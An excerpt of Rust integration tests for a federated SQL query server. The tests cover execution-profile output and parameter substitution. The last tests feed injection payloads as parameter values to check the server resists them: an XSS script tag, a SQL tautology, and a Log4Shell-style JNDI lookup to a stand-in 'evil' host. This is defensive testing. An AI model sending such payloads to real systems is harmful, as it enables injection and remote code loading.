...
impl FederatedConnector for AnalyzeConnector {
    ...
    async fn discover_schemas(&self) -> Result<Vec<SchemaInfo>, ConnectorError> { Ok(vec![SchemaInfo { name: "users".into(), schema_type: SchemaType::Table, estimated_row_count: Some(3) }]) }
...
fn build_app() -> axum::Router {
    ...
    registry.register(Arc::new(AnalyzeConnector("ds1".into()))).unwrap();
    registry.register(Arc::new(AnalyzeConnector("ds2".into()))).unwrap();
    let state = Arc::new(AppState {
        ...
        shared_audit_log: fuse_server::shared_state::SharedAuditLog::from_env(), transactions: std::sync::Arc::new(fuse_server::transaction::TransactionStore::new()), max_result_bytes: 0, datasource_limiter: std::sync::Arc::new(fuse_server::rate_limit::DatasourceLimiter::new()), adaptive_parallelism: std::sync::Arc::new(fuse_server::adaptive_parallelism::AdaptiveParallelism::new()), otel_store: None, query_recorder: std::sync::Arc::new(fuse_server::query_replay::QueryRecorder::new(100)), webhook_registry: std::sync::Arc::new(fuse_server::webhook::WebhookRegistry::new()), compilation_cache: std::sync::Arc::new(fuse_server::query_compilation::CompilationCache::new(300, 5000)), cdc_tracker: std::sync::Arc::new(fuse_server::cdc::CdcTracker::new(1000)),
...
async fn test_analyze_returns_profile() {
    ...
    assert!(json["execution_profile"].is_object(), "should have execution_profile: {:?}", json);
}
...
async fn test_analyze_row_count_matches_actual() {
    ...
    assert_eq!(profile_rows, actual_rows, "profile rows should match actual");
}

#[tokio::test]
async fn test_analyze_timing_is_nonzero() {
    let (_, json) = query_analyze(build_app(), "SELECT * FROM ds1.users").await;
    let ms = json["execution_profile"]["nodes"][0]["actual_ms"].as_u64().unwrap();
...
async fn test_analyze_has_estimate_accuracy() {
    ...
    assert!(acc.is_some(), "should have estimate_accuracy: {:?}", json["execution_profile"]);
    assert!(acc.unwrap().contains("vs actual"), "should show est vs actual");
}
...
async fn test_no_analyze_omits_profile() {
    ...
    assert_eq!(status, StatusCode::OK);
    assert!(json["execution_profile"].is_null(), "should not have profile without analyze=true");
}

#[tokio::test]
async fn test_analyze_union_has_children() {
    let (_, json) = query_analyze(build_app(), "SELECT * FROM ds1.users UNION ALL SELECT * FROM ds2.users").await;
    let nodes = &json["execution_profile"]["nodes"];
    let has_children = nodes[0]["children"].as_array().map(|c| !c.is_empty()).unwrap_or(false);
    // UNION should have child scan nodes
    let total_rows = json["rows"].as_array().unwrap().len();
    assert_eq!(total_rows, 6, "UNION of 3+3 rows");
    assert!(has_children || nodes.as_array().map(|n| n.len() > 1).unwrap_or(false),
...
async fn test_param_substitution_basic() {
    ...
    assert!(resp.status().is_success() || resp.status() == StatusCode::BAD_REQUEST,
        "param query should not crash: {}", resp.status());
}
...
async fn test_param_injection_attempt() {
    ...
    assert!(status.is_success() || status.is_client_error(),
        "injection should not cause server error: {} {:?}", status, json);
    // If it returns rows, they should be from the mock (not a real DROP)
    if let Some(rows) = json["rows"].as_array() {
        assert!(rows.len() <= 3, "should return mock data, not injected result");
    }
}

#[tokio::test]
async fn test_param_with_special_chars() {
    for payload in ["<script>alert(1)</script>", "\\0\\n\\r", "' OR '1'='1", "${jndi:ldap://evil}"] {
        let body = serde_json::json!({
            "query": "SELECT * FROM ds1.users WHERE name = $name",
            "format": "sql",
            "params": { "name": payload }
        ...
        assert_ne!(resp.status(), StatusCode::INTERNAL_SERVER_ERROR,
            "special chars should not cause 500: payload={}", payload);
    }
}
